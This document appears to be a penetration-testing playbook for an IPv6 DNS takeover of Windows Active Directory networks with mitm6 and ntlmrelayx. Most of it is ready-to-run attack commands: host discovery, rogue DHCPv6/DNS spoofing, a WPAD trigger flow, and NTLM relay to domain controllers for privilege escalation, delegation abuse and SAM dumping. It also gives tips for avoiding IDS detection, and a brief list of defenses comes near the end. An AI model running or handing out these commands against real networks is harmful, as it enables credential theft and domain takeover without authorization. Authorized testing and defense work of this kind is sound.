# SLAAC Attack — IPv6 DNS Takeover via mitm6

## When this applies

- Target is a Windows network with IPv6 enabled (default on Vista+; nearly every modern Windows host).
- IPv4 DNS is configured but IPv6 DNS is not — Windows prefers IPv6 when offered.
- Goal is to become the network's IPv6 DNS server, then poison name resolution for AD-joined hosts → triggers WPAD lookup → NTLM hash capture or relay.

## Technique

mitm6 listens for DHCPv6 solicitations and Router Advertisement (RA) requests, then replies with a DHCPv6 advertisement assigning the attacker as IPv6 DNS server. Windows happily uses the attacker's IPv6 DNS for name resolution. Combined with WPAD auto-discovery, the attacker can serve a malicious WPAD file and capture/relay authentication.

## Steps

### 1. Confirm IPv6 is in use

```bash
# IPv6 link-local hosts on the segment
sudo tcpdump -i eth0 -nn 'icmp6'

# Active IPv6 host discovery
ping6 -c 3 ff02::1%eth0          # all-nodes multicast

# THC-IPv6
sudo atk6-alive6 eth0
```

Most Windows hosts respond to multicast NS/NA exchanges — IPv6 is on even when admins think they "only use IPv4".

### 2. Run mitm6

```bash
# Default: target a specific domain
sudo mitm6 -d target.local

# Without domain filter — attacks every host on the segment
sudo mitm6 -i eth0

# Verbose output, single iteration test
sudo mitm6 -d target.local -v
```

mitm6 starts listening for:
- DHCPv6 SOLICIT (Windows sends one every ~30 min by default)
- Router Solicitation (RS)

Replies make the attacker the:
- IPv6 default gateway (via crafted RA)
- IPv6 DNS server (via DHCPv6 advertise + reply)

### 3. Combine with ntlmrelayx for credential capture / relay

```bash
# Relay incoming HTTP/SMB auth to LDAP for ACL abuse
sudo impacket-ntlmrelayx -6 -wh attacker-wpad -t ldaps://DC --escalate-user PWNED_USER

# Relay to SMB for lateral movement (signing not required targets)
sudo impacket-ntlmrelayx -6 -wh attacker-wpad -tf relay-targets.txt -smb2support
```

`-wh attacker-wpad` triggers a WPAD reply containing a `wpad.dat` that points the victim's browser at a proxy on `attacker-wpad`. The victim then authenticates to that proxy (NTLM via HTTP `Proxy-Authorization`).

### 4. WPAD trigger flow

1. Windows host wakes up / refreshes DHCPv6.
2. mitm6 replies → attacker becomes IPv6 DNS.
3. Windows queries `wpad.target.local` (DNS).
4. mitm6 returns AAAA = attacker's IPv6.
5. Windows fetches `http://wpad/wpad.dat` over HTTP.
6. ntlmrelayx serves a `wpad.dat`, prompting NTLM auth.
7. Captured credentials are relayed (LDAP, SMB, MSSQL, HTTP).

### 5. Relay outcomes

| Relay target | Action |
|---|---|
| LDAP/LDAPS on DC | `--delegate-access` for RBCD, `--escalate-user` for DCSync rights, dump domain via `--dump` |
| SMB on member server | Lateral move, dump SAM, push payloads |
| MSSQL | Authenticated SQL session as the relayed user |
| ADCS HTTP | ESC8 — request DC cert, PKINIT to TGT |

### 6. Defenses to recognize and document

- IPv6 disabled on adapters (registry + GPO)
- DHCPv6 server with explicit DNS option (preempts mitm6's DHCPv6 advertise)
- WPAD disabled in Group Policy and DNS WPAD blocklist
- LDAP signing + channel binding required
- SMB signing required everywhere

## Verifying success

- mitm6 console shows DHCPv6 replies sent to victim hosts.
- ntlmrelayx logs incoming HTTP authentication with hostnames and NTLM domain.
- Successful relay → "AUTHENTICATING ... SUCCEED" line.
- Post-relay: dumped SAM/LDAP/database results saved by ntlmrelayx.

## Common pitfalls

- **DHCPv6 SOLICIT cadence is slow** — Windows sends every 30 min by default. Wait or trigger manually (force a renewal via PowerShell on a test host: `ipconfig /renew6`).
- **macOS / Linux clients** generally ignore mitm6's DHCPv6 — only Windows is reliably targetable.
- **Network segment scope** — RA/DHCPv6 are link-local. Must be on the same broadcast domain (or VLAN-trunked).
- **Wireshark/IPS detection**: many IDS/IPS rules detect rogue RAs and DHCPv6 servers. Run on a quiet segment.
- **Edge / Chrome PNA** can affect WPAD over IPv6 in modern builds — test against the actual browsers used.
- **WPAD over IPv6** requires the target to even attempt WPAD. GPO `Internet Explorer / Edge: Disable Auto-Detect proxy settings` prevents WPAD lookup.
- **`-wh` host name** must resolve via the rogue DNS — usually mitm6 handles this for you, but verify the AAAA record being returned matches the listener.

## Tools

- mitm6 (Fox-IT) — the primary tool
- impacket-ntlmrelayx (`-6` enables IPv6 listener)
- THC-IPv6 (`atk6-alive6`, `atk6-fake_router6` for alternative attacks)
- Responder (IPv4 LLMNR/NBT-NS, often run alongside mitm6)
- BloodHound (post-relay, identify privilege paths from relayed identity)
